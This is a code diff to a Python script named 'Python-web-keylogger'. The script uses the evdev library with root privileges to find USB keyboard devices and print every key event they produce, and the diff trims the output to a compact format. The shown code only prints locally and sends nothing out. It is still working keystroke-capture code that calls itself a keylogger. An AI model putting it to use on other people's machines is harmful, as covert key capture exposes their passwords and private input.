@@ -4,7 +4,10 @@ Author: Gustavo Martin Vela
 Python-web-keylogger
 2013
 
+Based on the python-evdev library from https://github.com/gvalkov/python-evdev/ 
+
 IT IS NECESSARY TO PLAY THIS SCRIPT WITH ROOT PRIVILEGES (SUDO)
+
 '''
 
 
@@ -16,7 +19,8 @@ from select import select
 # Regular expressions library to catch the keys inside the events
 #import re
 
-evfmt = 'time {:<16} type {} ({}), code {:<4} ({}), value {}'
+#evfmt = 'time {:<16} type {} ({}), code {:<4} ({}), value {}'
+minimal_evfmt = '{},{},{}'
 
 # This list is to enter the strings in uppercase that we want to search
 wanted_devices_string_list = ["USB", "KEYBOARD"]
@@ -39,7 +43,7 @@ for dev in devices:
 			interesting_devices_dict[wanted_string] = dev
 			# Put all the wanted devives in the new tuple
 			wanted_devices_list.append(dev.fn)
-	#print( '%-20s %-32s %s' % (dev.fn, dev.name, dev.phys) )
+	print( '%-20s %-32s %s' % (dev.fn, dev.name, dev.phys) )
 
 # Searching in all the interesting devices
 #for key, device in interesting_devices_dict.iteritems():
@@ -50,20 +54,20 @@ for dev in devices:
 devices = map(InputDevice, wanted_devices_list)
 devices = {dev.fd : dev for dev in devices}
 
-# This method is from evdev examples. It is very useful!
+# This method is derived from evdev examples. It is very useful!
 def print_event(e):
     if e.type == ecodes.EV_SYN:
-        if e.code == ecodes.SYN_MT_REPORT:
-            print('time {:<16} +++++++++ {} ++++++++'.format(e.timestamp(), ecodes.SYN[e.code]))
-        else:
-            print('time {:<16} --------- {} --------'.format(e.timestamp(), ecodes.SYN[e.code]))
+        print('{}'.format(ecodes.SYN[e.code]))
+        # SYN_MT_REPORT is to Multitouch Devices. In this case it is not necessary for the moment!
+        # All these events are well described in https://www.kernel.org/doc/Documentation/input/event-codes.txt
     else:
         if e.type in ecodes.bytype:
             codename = ecodes.bytype[e.type][e.code]
         else:
-            codename = '?'
+            codename = 'UNKNOWN'
+        print(minimal_evfmt.format(ecodes.EV[e.type], codename, e.value))
+        #print(evfmt.format(e.timestamp(), e.type, ecodes.EV[e.type], e.code, codename, e.value))
 
-        print(evfmt.format(e.timestamp(), e.type, ecodes.EV[e.type], e.code, codename, e.value))
 
 # Iterating infinitely over events from our interesting devices
 while True:
